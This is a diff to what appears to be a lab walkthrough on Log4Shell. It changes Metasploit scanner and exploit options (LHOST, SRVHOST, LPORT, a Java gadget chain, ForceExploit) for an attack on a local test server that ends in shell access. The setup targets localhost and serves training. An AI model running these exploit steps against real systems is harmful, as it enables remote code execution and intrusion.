@@ -51,7 +51,7 @@ Use the Metasploit module `scanner/http/log4shell_scanner`. The scanner finds th
 msf6> use auxiliary/scanner/http/log4shell_scanner
 msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS localhost
 msf6 auxiliary(scanner/http/log4shell_scanner) > set RPORT 8080
-msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.5.2
+msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST en0
 msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVPORT 1389
 msf6 auxiliary(scanner/http/log4shell_scanner) > run
 
@@ -68,12 +68,13 @@ To work on the lab environment, we use the following options. Replace the LHOST 
 set HTTP_HEADER User-Agent
 set RHOSTS 127.0.0.1
 set RPORT 8080
-set LHOST 192.168.5.2
-set LPORT 443
-set SRVHOST 192.168.5.2
+set LHOST en0
+set LPORT 4444
+set SRVHOST en0
 set SRVPORT 1389
 set target 2
 set JAVA_GADGET_CHAIN BeanFactory
+set ForceExploit true
 ```
 
 Run the exploit and we get shell access.
